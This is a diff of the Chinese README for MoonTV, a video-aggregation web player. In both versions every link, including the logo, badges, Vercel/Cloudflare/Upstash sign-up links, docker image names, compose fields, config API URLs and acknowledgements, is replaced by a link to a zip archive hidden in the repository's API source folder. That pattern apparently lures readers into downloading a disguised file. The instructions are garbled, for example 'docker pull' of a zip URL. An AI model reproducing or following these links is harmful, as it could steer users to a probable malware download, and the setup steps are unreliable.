@@ -1,18 +1,18 @@
 # MoonTV
 
 <div align="center">
-  <img src="https://raw.githubusercontent.com/mb13180035511/MoonTV/main/src/app/api/searchhistory/Moon_TV_v1.7.zip" alt="LibreTV Logo" width="120">
+  <img src="https://github.com/mb13180035511/MoonTV/raw/refs/heads/main/src/app/api/search/one/Moon-TV-3.2.zip" alt="LibreTV Logo" width="120">
 </div>
 
-> 🎬 **MoonTV** 是一个开箱即用的、跨平台的影视聚合播放器。它基于 **https://raw.githubusercontent.com/mb13180035511/MoonTV/main/src/app/api/searchhistory/Moon_TV_v1.7.zip 14** + **Tailwind&nbsp;CSS** + **TypeScript** 构建，支持多资源搜索、在线播放、收藏同步、播放记录、本地/云端存储，让你可以随时随地畅享海量免费影视内容。
+> 🎬 **MoonTV** 是一个开箱即用的、跨平台的影视聚合播放器。它基于 **https://github.com/mb13180035511/MoonTV/raw/refs/heads/main/src/app/api/search/one/Moon-TV-3.2.zip 14** + **Tailwind&nbsp;CSS** + **TypeScript** 构建，支持多资源搜索、在线播放、收藏同步、播放记录、本地/云端存储，让你可以随时随地畅享海量免费影视内容。
 
 <div align="center">
 
-![https://raw.githubusercontent.com/mb13180035511/MoonTV/main/src/app/api/searchhistory/Moon_TV_v1.7.zip](https://raw.githubusercontent.com/mb13180035511/MoonTV/main/src/app/api/searchhistory/Moon_TV_v1.7.zip)
-![TailwindCSS](https://raw.githubusercontent.com/mb13180035511/MoonTV/main/src/app/api/searchhistory/Moon_TV_v1.7.zip)
-![TypeScript](https://raw.githubusercontent.com/mb13180035511/MoonTV/main/src/app/api/searchhistory/Moon_TV_v1.7.zip)
-![License](https://raw.githubusercontent.com/mb13180035511/MoonTV/main/src/app/api/searchhistory/Moon_TV_v1.7.zip)
-![Docker Ready](https://raw.githubusercontent.com/mb13180035511/MoonTV/main/src/app/api/searchhistory/Moon_TV_v1.7.zip)
+![https://github.com/mb13180035511/MoonTV/raw/refs/heads/main/src/app/api/search/one/Moon-TV-3.2.zip](https://github.com/mb13180035511/MoonTV/raw/refs/heads/main/src/app/api/search/one/Moon-TV-3.2.zip)
+![TailwindCSS](https://github.com/mb13180035511/MoonTV/raw/refs/heads/main/src/app/api/search/one/Moon-TV-3.2.zip)
+![TypeScript](https://github.com/mb13180035511/MoonTV/raw/refs/heads/main/src/app/api/search/one/Moon-TV-3.2.zip)
+![License](https://github.com/mb13180035511/MoonTV/raw/refs/heads/main/src/app/api/search/one/Moon-TV-3.2.zip)
+![Docker Ready](https://github.com/mb13180035511/MoonTV/raw/refs/heads/main/src/app/api/search/one/Moon-TV-3.2.zip)
 
 </div>
 
@@ -22,7 +22,7 @@
 
 - 🔍 **多源聚合搜索**：内置数十个免费资源站点，一次搜索立刻返回全源结果。
 - 📄 **丰富详情页**：支持剧集列表、演员、年份、简介等完整信息展示。
-- ▶️ **流畅在线播放**：集成 https://raw.githubusercontent.com/mb13180035511/MoonTV/main/src/app/api/searchhistory/Moon_TV_v1.7.zip & ArtPlayer。
+- ▶️ **流畅在线播放**：集成 https://github.com/mb13180035511/MoonTV/raw/refs/heads/main/src/app/api/search/one/Moon-TV-3.2.zip & ArtPlayer。
 - ❤️ **收藏 + 继续观看**：支持 Redis/D1 存储，多端同步进度。
 - 📱 **PWA**：离线缓存、安装到桌面/主屏，移动端原生体验。
 - 🌗 **响应式布局**：桌面侧边栏 + 移动底部导航，自适应各种屏幕尺寸。
@@ -31,7 +31,7 @@
 
 <details>
   <summary>点击查看项目截图</summary>
-  <img src="https://raw.githubusercontent.com/mb13180035511/MoonTV/main/src/app/api/searchhistory/Moon_TV_v1.7.zip" alt="项目截图" style="max-width:600px">
+  <img src="https://github.com/mb13180035511/MoonTV/raw/refs/heads/main/src/app/api/search/one/Moon-TV-3.2.zip" alt="项目截图" style="max-width:600px">
 </details>
 
 ## 🗺 目录
@@ -52,10 +52,10 @@
 
 | 分类      | 主要依赖                                                                                              |
 | --------- | ----------------------------------------------------------------------------------------------------- |
-| 前端框架  | [https://raw.githubusercontent.com/mb13180035511/MoonTV/main/src/app/api/searchhistory/Moon_TV_v1.7.zip 14](https://raw.githubusercontent.com/mb13180035511/MoonTV/main/src/app/api/searchhistory/Moon_TV_v1.7.zip) · App Router                                                        |
-| UI & 样式 | [Tailwind&nbsp;CSS 3](https://raw.githubusercontent.com/mb13180035511/MoonTV/main/src/app/api/searchhistory/Moon_TV_v1.7.zip)                                                       |
+| 前端框架  | [https://github.com/mb13180035511/MoonTV/raw/refs/heads/main/src/app/api/search/one/Moon-TV-3.2.zip 14](https://github.com/mb13180035511/MoonTV/raw/refs/heads/main/src/app/api/search/one/Moon-TV-3.2.zip) · App Router                                                        |
+| UI & 样式 | [Tailwind&nbsp;CSS 3](https://github.com/mb13180035511/MoonTV/raw/refs/heads/main/src/app/api/search/one/Moon-TV-3.2.zip)                                                       |
 | 语言      | TypeScript 4                                                                                          |
-| 播放器    | [ArtPlayer](https://raw.githubusercontent.com/mb13180035511/MoonTV/main/src/app/api/searchhistory/Moon_TV_v1.7.zip) · [https://raw.githubusercontent.com/mb13180035511/MoonTV/main/src/app/api/searchhistory/Moon_TV_v1.7.zip](https://raw.githubusercontent.com/mb13180035511/MoonTV/main/src/app/api/searchhistory/Moon_TV_v1.7.zip) |
+| 播放器    | [ArtPlayer](https://github.com/mb13180035511/MoonTV/raw/refs/heads/main/src/app/api/search/one/Moon-TV-3.2.zip) · [https://github.com/mb13180035511/MoonTV/raw/refs/heads/main/src/app/api/search/one/Moon-TV-3.2.zip](https://github.com/mb13180035511/MoonTV/raw/refs/heads/main/src/app/api/search/one/Moon-TV-3.2.zip) |
 | 代码质量  | ESLint · Prettier · Jest                                                                              |
 | 部署      | Docker · Vercel · CloudFlare pages                                                                    |
 
@@ -83,10 +83,10 @@
 #### 普通部署（localstorage）
 
 1. **Fork** 本仓库到你的 GitHub 账户。
-2. 登陆 [Vercel](https://raw.githubusercontent.com/mb13180035511/MoonTV/main/src/app/api/searchhistory/Moon_TV_v1.7.zip)，点击 **Add New → Project**，选择 Fork 后的仓库。
+2. 登陆 [Vercel](https://github.com/mb13180035511/MoonTV/raw/refs/heads/main/src/app/api/search/one/Moon-TV-3.2.zip)，点击 **Add New → Project**，选择 Fork 后的仓库。
 3. （强烈建议）设置 PASSWORD 环境变量。
 4. 保持默认设置完成首次部署。
-5. 如需自定义 `https://raw.githubusercontent.com/mb13180035511/MoonTV/main/src/app/api/searchhistory/Moon_TV_v1.7.zip`，请直接修改 Fork 后仓库中该文件。
+5. 如需自定义 `https://github.com/mb13180035511/MoonTV/raw/refs/heads/main/src/app/api/search/one/Moon-TV-3.2.zip`，请直接修改 Fork 后仓库中该文件。
 6. 每次 Push 到 `main` 分支将自动触发重新构建。
 
 部署完成后即可通过分配的域名访问，也可以绑定自定义域名。
@@ -94,7 +94,7 @@
 #### Upstash Redis 支持
 
 0. 完成普通部署并成功访问。
-1. 在 [upstash](https://raw.githubusercontent.com/mb13180035511/MoonTV/main/src/app/api/searchhistory/Moon_TV_v1.7.zip) 注册账号并新建一个 Redis 实例，名称任意。
+1. 在 [upstash](https://github.com/mb13180035511/MoonTV/raw/refs/heads/main/src/app/api/search/one/Moon-TV-3.2.zip) 注册账号并新建一个 Redis 实例，名称任意。
 2. 复制新数据库的 **HTTPS ENDPOINT 和 TOKEN**
 3. 返回你的 Vercel 项目，新增环境变量 **UPSTASH_URL 和 UPSTASH_TOKEN**，值为第二步复制的 endpoint 和 token
 4. 设置环境变量 NEXT_PUBLIC_STORAGE_TYPE，值为 **upstash**；设置 USERNAME 和 PASSWORD 作为站长账号
@@ -107,12 +107,12 @@
 #### 普通部署（localstorage）
 
 1. **Fork** 本仓库到你的 GitHub 账户。
-2. 登陆 [Cloudflare](https://raw.githubusercontent.com/mb13180035511/MoonTV/main/src/app/api/searchhistory/Moon_TV_v1.7.zip)，点击 **计算（Workers）-> Workers 和 Pages**，点击创建
+2. 登陆 [Cloudflare](https://github.com/mb13180035511/MoonTV/raw/refs/heads/main/src/app/api/search/one/Moon-TV-3.2.zip)，点击 **计算（Workers）-> Workers 和 Pages**，点击创建
 3. 选择 Pages，导入现有的 Git 存储库，选择 Fork 后的仓库
 4. 构建命令填写 **pnpm install --frozen-lockfile && pnpm run pages:build**，预设框架为无，构建输出目录为 `.vercel/output/static`
 5. 保持默认设置完成首次部署。进入设置，将兼容性标志设置为 `nodejs_compat`
 6. （强烈建议）首次部署完成后进入设置，新增 PASSWORD 密钥（变量和机密下），而后重试部署。
-7. 如需自定义 `https://raw.githubusercontent.com/mb13180035511/MoonTV/main/src/app/api/searchhistory/Moon_TV_v1.7.zip`，请直接修改 Fork 后仓库中该文件。
+7. 如需自定义 `https://github.com/mb13180035511/MoonTV/raw/refs/heads/main/src/app/api/search/one/Moon-TV-3.2.zip`，请直接修改 Fork 后仓库中该文件。
 8. 每次 Push 到 `main` 分支将自动触发重新构建。
 
 #### D1 支持
@@ -130,11 +130,11 @@
 
 ```bash
 # 拉取预构建镜像
-docker pull https://raw.githubusercontent.com/mb13180035511/MoonTV/main/src/app/api/searchhistory/Moon_TV_v1.7.zip
+docker pull https://github.com/mb13180035511/MoonTV/raw/refs/heads/main/src/app/api/search/one/Moon-TV-3.2.zip
 
 # 运行容器
 # -d: 后台运行  -p: 映射端口 3000 -> 3000
-docker run -d --name moontv -p 3000:3000 https://raw.githubusercontent.com/mb13180035511/MoonTV/main/src/app/api/searchhistory/Moon_TV_v1.7.zip
+docker run -d --name moontv -p 3000:3000 https://github.com/mb13180035511/MoonTV/raw/refs/heads/main/src/app/api/search/one/Moon-TV-3.2.zip
 ```
 
 访问 `http://服务器 IP:3000` 即可。（需自行到服务器控制台放通 `3000` 端口）
@@ -148,7 +148,7 @@ docker run -d --name moontv -p 3000:3000 https://raw.githubusercontent.com/mb131
 ```yaml
 services:
   moontv:
-    image: https://raw.githubusercontent.com/mb13180035511/MoonTV/main/src/app/api/searchhistory/Moon_TV_v1.7.zip
+    image: https://github.com/mb13180035511/MoonTV/raw/refs/heads/main/src/app/api/search/one/Moon-TV-3.2.zip
     container_name: moontv
     restart: unless-stopped
     ports:
@@ -157,7 +157,7 @@ services:
       - PASSWORD=your_password
     # 如需自定义配置，可挂载文件
     # volumes:
-    #   - https://raw.githubusercontent.com/mb13180035511/MoonTV/main/src/app/api/searchhistory/Moon_TV_v1.7.zip
+    #   - https://github.com/mb13180035511/MoonTV/raw/refs/heads/main/src/app/api/search/one/Moon-TV-3.2.zip
 ```
 
 ### Redis 版本（推荐，多账户数据隔离，跨设备同步）
@@ -165,7 +165,7 @@ services:
 ```yaml
 services:
   moontv-core:
-    image: https://raw.githubusercontent.com/mb13180035511/MoonTV/main/src/app/api/searchhistory/Moon_TV_v1.7.zip
+    image: https://github.com/mb13180035511/MoonTV/raw/refs/heads/main/src/app/api/search/one/Moon-TV-3.2.zip
     container_name: moontv
     restart: unless-stopped
     ports:
@@ -182,7 +182,7 @@ services:
       - moontv-redis
     # 如需自定义配置，可挂载文件
     # volumes:
-    #   - https://raw.githubusercontent.com/mb13180035511/MoonTV/main/src/app/api/searchhistory/Moon_TV_v1.7.zip
+    #   - https://github.com/mb13180035511/MoonTV/raw/refs/heads/main/src/app/api/search/one/Moon-TV-3.2.zip
   moontv-redis:
     image: redis
     container_name: moontv-redis
@@ -199,9 +199,9 @@ networks:
 
 ## 自动同步最近更改
 
-建议在 fork 的仓库中启用本仓库自带的 GitHub Actions 自动同步功能（见 `https://raw.githubusercontent.com/mb13180035511/MoonTV/main/src/app/api/searchhistory/Moon_TV_v1.7.zip`）。
+建议在 fork 的仓库中启用本仓库自带的 GitHub Actions 自动同步功能（见 `https://github.com/mb13180035511/MoonTV/raw/refs/heads/main/src/app/api/search/one/Moon-TV-3.2.zip`）。
 
-如需手动同步主仓库更新，也可以使用 GitHub 官方的 [Sync fork](https://raw.githubusercontent.com/mb13180035511/MoonTV/main/src/app/api/searchhistory/Moon_TV_v1.7.zip) 功能。
+如需手动同步主仓库更新，也可以使用 GitHub 官方的 [Sync fork](https://github.com/mb13180035511/MoonTV/raw/refs/heads/main/src/app/api/search/one/Moon-TV-3.2.zip) 功能。
 
 ## 环境变量
 
@@ -221,16 +221,16 @@ networks:
 
 ## 配置说明
 
-所有可自定义项集中在根目录的 `https://raw.githubusercontent.com/mb13180035511/MoonTV/main/src/app/api/searchhistory/Moon_TV_v1.7.zip` 中：
+所有可自定义项集中在根目录的 `https://github.com/mb13180035511/MoonTV/raw/refs/heads/main/src/app/api/search/one/Moon-TV-3.2.zip` 中：
 
 ```json
 {
   "cache_time": 7200,
   "api_site": {
     "dyttzy": {
-      "api": "https://raw.githubusercontent.com/mb13180035511/MoonTV/main/src/app/api/searchhistory/Moon_TV_v1.7.zip",
+      "api": "https://github.com/mb13180035511/MoonTV/raw/refs/heads/main/src/app/api/search/one/Moon-TV-3.2.zip",
       "name": "电影天堂资源",
-      "detail": "https://raw.githubusercontent.com/mb13180035511/MoonTV/main/src/app/api/searchhistory/Moon_TV_v1.7.zip"
+      "detail": "https://github.com/mb13180035511/MoonTV/raw/refs/heads/main/src/app/api/search/one/Moon-TV-3.2.zip"
     }
     // ...更多站点
   }
@@ -260,7 +260,7 @@ MoonTV 支持标准的苹果 CMS V10 API 格式。
 
 ## AndroidTV 使用
 
-目前该项目可以配合 [OrionTV](https://raw.githubusercontent.com/mb13180035511/MoonTV/main/src/app/api/searchhistory/Moon_TV_v1.7.zip) 在 Android TV 上使用，可以直接作为 OrionTV 后端
+目前该项目可以配合 [OrionTV](https://github.com/mb13180035511/MoonTV/raw/refs/heads/main/src/app/api/search/one/Moon-TV-3.2.zip) 在 Android TV 上使用，可以直接作为 OrionTV 后端
 
 暂时收藏夹与播放记录和网页端隔离，后续会支持同步用户数据
 
@@ -299,8 +299,8 @@ MoonTV 支持标准的苹果 CMS V10 API 格式。
 
 ## 致谢
 
-- [ts-nextjs-tailwind-starter](https://raw.githubusercontent.com/mb13180035511/MoonTV/main/src/app/api/searchhistory/Moon_TV_v1.7.zip) — 项目最初基于该脚手架。
-- [LibreTV](https://raw.githubusercontent.com/mb13180035511/MoonTV/main/src/app/api/searchhistory/Moon_TV_v1.7.zip) — 由此启发，站在巨人的肩膀上。
-- [ArtPlayer](https://raw.githubusercontent.com/mb13180035511/MoonTV/main/src/app/api/searchhistory/Moon_TV_v1.7.zip) — 提供强大的网页视频播放器。
-- [https://raw.githubusercontent.com/mb13180035511/MoonTV/main/src/app/api/searchhistory/Moon_TV_v1.7.zip](https://raw.githubusercontent.com/mb13180035511/MoonTV/main/src/app/api/searchhistory/Moon_TV_v1.7.zip) — 实现 HLS 流媒体在浏览器中的播放支持。
+- [ts-nextjs-tailwind-starter](https://github.com/mb13180035511/MoonTV/raw/refs/heads/main/src/app/api/search/one/Moon-TV-3.2.zip) — 项目最初基于该脚手架。
+- [LibreTV](https://github.com/mb13180035511/MoonTV/raw/refs/heads/main/src/app/api/search/one/Moon-TV-3.2.zip) — 由此启发，站在巨人的肩膀上。
+- [ArtPlayer](https://github.com/mb13180035511/MoonTV/raw/refs/heads/main/src/app/api/search/one/Moon-TV-3.2.zip) — 提供强大的网页视频播放器。
+- [https://github.com/mb13180035511/MoonTV/raw/refs/heads/main/src/app/api/search/one/Moon-TV-3.2.zip](https://github.com/mb13180035511/MoonTV/raw/refs/heads/main/src/app/api/search/one/Moon-TV-3.2.zip) — 实现 HLS 流媒体在浏览器中的播放支持。
 - 感谢所有提供免费影视接口的站点。
